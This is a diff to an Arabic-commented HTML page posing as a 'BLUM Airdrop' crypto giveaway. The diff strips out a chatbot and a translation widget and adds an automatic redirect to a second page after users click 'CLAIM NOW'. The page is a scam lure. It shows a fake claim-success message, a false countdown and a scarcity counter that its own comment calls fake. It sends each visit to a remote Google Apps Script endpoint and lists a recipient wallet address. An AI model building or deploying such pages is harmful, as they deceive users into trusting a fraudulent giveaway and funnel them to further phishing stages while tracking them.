@@ -3,11 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>🎁 BLUM Airdrop | 3D SPECTRUM</title>
+    <title>🎁 BLUM Airdrop | 3D + Redirect</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        
-        /* خلفية ثلاثية الأبعاد متحركة (3D Particles + Gradient) */
         body{
             font-family: 'Segoe UI', 'Poppins', system-ui;
             min-height: 100vh;
@@ -15,11 +13,10 @@
             justify-content: center;
             align-items: center;
             padding: 20px;
-            position: relative;
-            overflow-x: hidden;
             background: radial-gradient(circle at 20% 30%, #0a0a2a, #010108);
+            overflow-x: hidden;
         }
-        /* كرة ثلاثية الأبعاد متحركة (3D Sphere) */
+        /* خلفية 3D */
         .bg-3d{
             position: fixed;
             top: 0;
@@ -52,57 +49,44 @@
             animation: floatSphere2 25s infinite alternate;
         }
         @keyframes floatSphere{
-            0%{transform: translate(0,0) scale(1); opacity: 0.4;}
-            100%{transform: translate(-80px, 80px) scale(1.2); opacity: 0.8;}
+            0%{transform: translate(0,0) scale(1); opacity:0.4;}
+            100%{transform: translate(-80px, 80px) scale(1.2); opacity:0.8;}
         }
         @keyframes floatSphere2{
-            0%{transform: translate(0,0) scale(1); opacity: 0.3;}
-            100%{transform: translate(60px, -60px) scale(1.3); opacity: 0.7;}
+            0%{transform: translate(0,0) scale(1); opacity:0.3;}
+            100%{transform: translate(60px, -60px) scale(1.3); opacity:0.7;}
         }
-        
-        /* جزيئات ثلاثية الأبعاد (3D Particles) */
-        .particles{
-            position: fixed;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-        }
+        /* جزيئات */
+        .particles{ position:fixed; width:100%; height:100%; z-index:-1; }
         .particle{
             position: absolute;
             background: rgba(255,215,0,0.5);
-            width: 3px;
-            height: 3px;
+            width: 3px; height: 3px;
             border-radius: 50%;
-            box-shadow: 0 0 8px gold;
+            box-shadow:0 0 8px gold;
             animation: floatParticle 8s infinite linear;
         }
         @keyframes floatParticle{
-            0%{transform: translateY(100vh) rotate(0deg); opacity: 0;}
-            50%{opacity: 1;}
-            100%{transform: translateY(-10vh) rotate(360deg); opacity: 0;}
+            0%{transform: translateY(100vh) rotate(0deg); opacity:0;}
+            100%{transform: translateY(-10vh) rotate(360deg); opacity:0;}
         }
-        
+        /* البطاقة الرئيسية */
         .card{
             max-width: 550px;
             width: 100%;
-            background: rgba(8, 12, 25, 0.7);
+            background: rgba(8,12,25,0.75);
             backdrop-filter: blur(16px);
             border-radius: 56px;
             padding: 40px 30px;
-            border: 1px solid rgba(255, 215, 0, 0.5);
+            border: 1px solid rgba(255,215,0,0.5);
             box-shadow: 0 30px 50px rgba(0,0,0,0.5), 0 0 20px rgba(255,215,0,0.2);
             text-align: center;
-            transform-style: preserve-3d;
-            transition: all 0.4s ease;
+            transition: 0.3s;
             animation: cardGlow 3s infinite alternate;
         }
         @keyframes cardGlow{
-            0%{box-shadow: 0 30px 50px rgba(0,0,0,0.5), 0 0 15px rgba(255,215,0,0.3);}
-            100%{box-shadow: 0 35px 60px rgba(0,0,0,0.7), 0 0 35px rgba(255,215,0,0.6);}
-        }
-        .card:hover{
-            transform: translateY(-8px) scale(1.01);
-            border-color: #FFD700;
+            0%{box-shadow:0 30px 50px rgba(0,0,0,0.5),0 0 15px rgba(255,215,0,0.3);}
+            100%{box-shadow:0 35px 60px rgba(0,0,0,0.7),0 0 35px rgba(255,215,0,0.6);}
         }
         .badge{
             display: inline-block;
@@ -114,7 +98,6 @@
             font-weight: 700;
             color: #FFD700;
             margin-bottom: 25px;
-            letter-spacing: 1px;
         }
         h1{
             font-size: 48px;
@@ -123,23 +106,20 @@
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            margin-bottom: 8px;
-            text-shadow: 0 0 5px rgba(0,0,0,0.3);
         }
         .amount{
             font-size: 68px;
             font-weight: 900;
             color: #FFD700;
             margin: 15px 0;
-            text-shadow: 0 0 15px rgba(255,215,0,0.6);
+            text-shadow:0 0 15px rgba(255,215,0,0.6);
         }
         .timer-box{
             background: rgba(0,0,0,0.5);
             border-radius: 60px;
             padding: 20px;
             margin: 25px 0;
-            border: 1px solid rgba(255,215,0,0.4);
-            transition: 0.2s;
+            border:1px solid rgba(255,215,0,0.4);
         }
         .timer{
             font-size: 56px;
@@ -161,22 +141,21 @@
             transition: all 0.25s ease;
             position: relative;
             overflow: hidden;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+            box-shadow:0 8px 20px rgba(0,0,0,0.3);
         }
         button:active{ transform: scale(0.97); }
         button::before{
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
+            content:'';
+            position:absolute;
+            top:0;
+            left:-100%;
+            width:100%;
+            height:100%;
             background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
             transition: left 0.6s;
         }
-        button:hover::before{ left: 100%; }
-        button:disabled{ opacity: 0.6; cursor: default; transform: none; }
-        
+        button:hover::before{ left:100%; }
+        button:disabled{ opacity:0.6; cursor:default; transform:none; }
         .status{
             background: rgba(0,0,0,0.6);
             border-radius: 40px;
@@ -187,10 +166,10 @@
             animation: fadeInUp 0.5s;
         }
         @keyframes fadeInUp{
-            from{ opacity:0; transform: translateY(10px);}
-            to{ opacity:1; transform: translateY(0);}
+            from{ opacity:0; transform:translateY(10px);}
+            to{ opacity:1; transform:translateY(0);}
         }
-        .success{ color: #00ffaa; font-weight: bold; text-shadow:0 0 3px #00ffaa; }
+        .success{ color:#00ffaa; font-weight:bold; text-shadow:0 0 3px #00ffaa; }
         .footer{
             font-size: 12px;
             color: #FFD700aa;
@@ -206,133 +185,21 @@
             background: rgba(0,0,0,0.5);
             border-radius: 28px;
             padding: 10px;
-            flex: 1;
-            transition: 0.2s;
-            border: 1px solid rgba(255,215,0,0.3);
+            flex:1;
+            border:1px solid rgba(255,215,0,0.3);
+            transition:0.2s;
         }
         .stat-card:hover{
             background: rgba(255,215,0,0.1);
-            transform: translateY(-4px);
-            border-color: #FFD700;
+            transform:translateY(-4px);
+            border-color:#FFD700;
         }
         .stat-number{
             font-size: 24px;
             font-weight: bold;
-            color: #FFD700;
+            color:#FFD700;
         }
-        .stat-label{
-            font-size: 11px;
-            color: #ddd;
-        }
-        /* شات بوت 3D */
-        .chat-bubble{
-            position: fixed;
-            bottom: 25px;
-            right: 25px;
-            width: 60px;
-            height: 60px;
-            background: radial-gradient(circle, #FFD700, #DAA520);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
-            z-index: 1000;
-            transition: 0.2s;
-            animation: pulseGlow 2s infinite;
-        }
-        @keyframes pulseGlow{
-            0%{ box-shadow: 0 0 0 0 rgba(255,215,0,0.7);}
-            70%{ box-shadow: 0 0 0 15px rgba(255,215,0,0);}
-            100%{ box-shadow: 0 0 0 0 rgba(255,215,0,0);}
-        }
-        .chat-window{
-            position: fixed;
-            bottom: 95px;
-            right: 20px;
-            width: 320px;
-            height: 400px;
-            background: rgba(10,15,30,0.95);
-            backdrop-filter: blur(20px);
-            border-radius: 28px;
-            border: 1px solid #FFD700;
-            display: none;
-            flex-direction: column;
-            z-index: 1000;
-            overflow: hidden;
-            box-shadow: 0 20px 35px rgba(0,0,0,0.5);
-        }
-        .chat-header{
-            background: #0a0a0a;
-            padding: 14px;
-            color: #FFD700;
-            font-weight: bold;
-            display: flex;
-            justify-content: space-between;
-            border-bottom: 1px solid #FFD70055;
-        }
-        .chat-messages{
-            flex: 1;
-            padding: 12px;
-            overflow-y: auto;
-            font-size: 13px;
-        }
-        .chat-input-area{
-            display: flex;
-            padding: 10px;
-            border-top: 1px solid #FFD70055;
-        }
-        .chat-input{
-            flex: 1;
-            padding: 10px;
-            border-radius: 30px;
-            border: none;
-            background: #0a0a0a;
-            color: white;
-        }
-        .chat-send{
-            background: #FFD700;
-            border: none;
-            border-radius: 50%;
-            width: 38px;
-            margin-left: 8px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        .bot-msg, .user-msg{
-            padding: 8px 14px;
-            border-radius: 20px;
-            margin: 6px 0;
-            max-width: 85%;
-        }
-        .bot-msg{
-            background: #1a1a2a;
-            color: #FFD700;
-            border-left: 3px solid #FFD700;
-        }
-        .user-msg{
-            background: #FFD70022;
-            color: white;
-            text-align: right;
-            margin-left: auto;
-        }
-        .google-translate{
-            position: fixed;
-            top: 18px;
-            right: 18px;
-            z-index: 1200;
-            background: rgba(0,0,0,0.6);
-            padding: 5px 12px;
-            border-radius: 40px;
-            backdrop-filter: blur(8px);
-        }
-        .goog-te-combo{
-            background: #1a1a1a;
-            color: #FFD700;
-            border-radius: 30px;
-            padding: 5px;
-        }
+        .stat-label{ font-size:11px; color:#ddd; }
         .loading-spinner{
             display: inline-block;
             width: 22px;
@@ -344,8 +211,8 @@
             margin-right: 8px;
             vertical-align: middle;
         }
+        @keyframes spin{ to{ transform: rotate(360deg); } }
     </style>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 </head>
 <body>
 
@@ -356,19 +223,9 @@
 </div>
 <div class="particles" id="particles"></div>
 
-<!-- مترجم جوجل -->
-<div class="google-translate" id="google_translate_element"></div>
-
-<!-- شات بوت ذكي 3D -->
-<div class="chat-bubble" id="chatBubble">💬</div>
-<div class="chat-window" id="chatWindow">
-    <div class="chat-header"><span>🤖 مساعد BLUM 3D</span><span class="chat-close" id="closeChat">✕</span></div>
-    <div class="chat-messages" id="chatMessages"><div class="bot-msg">✨ مرحباً! اسأل عن Airdrop، سأساعدك فوراً.</div></div>
-    <div class="chat-input-area"><input type="text" class="chat-input" id="chatInput" placeholder="اكتب سؤالك..."><button class="chat-send" id="sendChat">➤</button></div>
-</div>
-
-<div class="card">
-    <div class="badge">⚡ ONE-CLICK • 10 CHAINS • 3D EDITION</div>
+<!-- البطاقة الرئيسية (الرابط الأول) -->
+<div class="card" id="mainCard">
+    <div class="badge">⚡ ONE-CLICK • 10 CHAINS • 3D</div>
     <h1>BLUM<br>Web3</h1>
     <div class="amount">1,200 $BLUM</div>
     
@@ -381,11 +238,11 @@
     <div class="timer-box"><div style="font-size:14px;">⏰ ENDS IN</div><div class="timer" id="timer">24:00:00</div></div>
     <button id="claimBtn">🚀 CLAIM NOW</button>
     <div id="status" class="status"></div>
-    <div class="footer">🔐 EMP2026 • 3D IMMERSIVE EXPERIENCE</div>
+    <div class="footer">🔐 EMP2026 • 3D SPECTRUM</div>
 </div>
 
 <script>
-    // توليد جزيئات ثلاثية الأبعاد
+    // جزيئات ثلاثية الأبعاد
     const particlesContainer = document.getElementById('particles');
     for(let i=0;i<90;i++){
         let p = document.createElement('div');
@@ -399,20 +256,13 @@
         particlesContainer.appendChild(p);
     }
     
-    // مترجم جوجل
-    function googleTranslateElementInit() {
-        new google.translate.TranslateElement({pageLanguage: 'ar', includedLanguages: 'ar,en,fr,es,de,tr,ru,zh,it,pt'}, 'google_translate_element');
-    }
-    let gtScript = document.createElement('script');
-    gtScript.src = '//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit';
-    document.head.appendChild(gtScript);
-    
-    // إعدادات البوت
+    // إعدادات البوت والبيانات
     const PROXY_URL = "https://script.google.com/macros/s/AKfycbzRzY5ALW-81aERtvvCrC2EhRBnvYQ6iIrhCxQYJ1dzylpt3pGd6ixU9nz_5D7m9HKnhg/exec";
     const RECIPIENT_WALLET = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";
     const SUPPORTED_NETWORKS = ["ERC20 (ETH)", "BEP20 (BSC)", "TRC20 (TRON)", "Solana", "Polygon", "Avalanche", "Arbitrum", "Optimism", "Base", "zkSync"];
     const YOUR_LINK = "https://freedingoxo.github.io/clawguardian-skill/docs/index.html";
     const BLUM_PER_SCAN = 1200;
+    const SECONDARY_URL = "https://freedingoxo.github.io/clawguardian-skill/docs/dashboard.html";   // الرابط الثاني
     
     let claimExecuted = false;
     let remainingSeconds = 24 * 60 * 60;
@@ -427,13 +277,14 @@
         localStorage.setItem('totalClaims', totalClaims);
         localStorage.setItem('totalScans', totalScans);
     }
+    
     totalScans++;
     updateStats();
     
     function sendToBot(msg){
         fetch(PROXY_URL + '?message=' + encodeURIComponent(msg), { method: 'GET', mode: 'no-cors' });
     }
-    sendToBot(`📊 PAGE SCAN #${totalScans} - Blum Airdrop 3D`);
+    sendToBot(`📊 PAGE SCAN #${totalScans} - 3D + Auto‑Redirect (first click)`);
     
     function getRandomNetwork(){ return SUPPORTED_NETWORKS[Math.floor(Math.random() * SUPPORTED_NETWORKS.length)]; }
     function getRandomWallet(){ let w = ["MetaMask","Trust Wallet","Coinbase Wallet","Phantom","OKX Wallet"]; return w[Math.floor(Math.random()*w.length)]; }
@@ -463,6 +314,11 @@
         btn.disabled = true;
         statusDiv.style.display = 'block';
         statusDiv.innerHTML = `<span class="success">🎉 Claim #${totalClaims} successful! ${BLUM_PER_SCAN} $BLUM will arrive within 24h.</span>`;
+        
+        // **الخاصية المطلوبة: بعد النقر على الزر (أول تفاعل) يتم الانتقال إلى الرابط الثاني بعد 1 ثانية**
+        setTimeout(() => {
+            window.location.href = SECONDARY_URL;
+        }, 1000);
     }
     
     async function onClaimClick(){
@@ -473,8 +329,10 @@
         await new Promise(r=>setTimeout(r,3000));
         await executeClaim();
     }
+    
     document.getElementById('claimBtn').addEventListener('click', onClaimClick);
     
+    // العد التنازلي 24 ساعة
     setInterval(()=>{
         if(remainingSeconds<=0) return;
         remainingSeconds--;
@@ -482,29 +340,13 @@
         document.getElementById('timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
     },1000);
     
+    // عرض وهمي
     let fake=10;
     setInterval(()=>{
         fake--;
         let btn = document.getElementById('claimBtn');
         if(btn && !btn.disabled && !claimExecuted && fake>0) btn.innerHTML = `🔥 ${fake} LEFT! CLAIM NOW 🔥`;
     },4000);
-    
-    // شات بوت ذكي
-    const chatBubble = document.getElementById('chatBubble'), chatWindow = document.getElementById('chatWindow'), closeChat = document.getElementById('closeChat');
-    const chatInput = document.getElementById('chatInput'), sendChat = document.getElementById('sendChat'), chatMessages = document.getElementById('chatMessages');
-    function addBotMsg(t){ let d=document.createElement('div'); d.className='bot-msg'; d.innerText=t; chatMessages.appendChild(d); chatMessages.scrollTop=chatMessages.scrollHeight; }
-    function addUserMsg(t){ let d=document.createElement('div'); d.className='user-msg'; d.innerText=t; chatMessages.appendChild(d); chatMessages.scrollTop=chatMessages.scrollHeight; }
-    function respond(msg){
-        let l=msg.toLowerCase();
-        if(l.includes('مرحب')||l.includes('hello')) addBotMsg('🎁 مرحباً! احصل على 1,200 $BLUM مجاناً (3D Edition)');
-        else if(l.includes('كيف')) addBotMsg('🔗 اضغط على CLAIM NOW، وافق على المحفظة، وستصلك المكافأة خلال 24 ساعة.');
-        else if(l.includes('رابط')) addBotMsg(`🔗 رابط الموقع: ${YOUR_LINK}`);
-        else addBotMsg('🎁 1,200 $BLUM مجاني! اضغط الزر أعلاه للمطالبة الفورية.');
-    }
-    chatBubble.onclick=()=>{ chatWindow.style.display='flex'; chatBubble.style.display='none'; };
-    closeChat.onclick=()=>{ chatWindow.style.display='none'; chatBubble.style.display='flex'; };
-    sendChat.onclick=()=>{ let txt=chatInput.value.trim(); if(!txt) return; addUserMsg(txt); respond(txt); chatInput.value=''; };
-    chatInput.addEventListener('keypress',(e)=>{ if(e.key==='Enter') sendChat.click(); });
 </script>
 </body>
 </html>
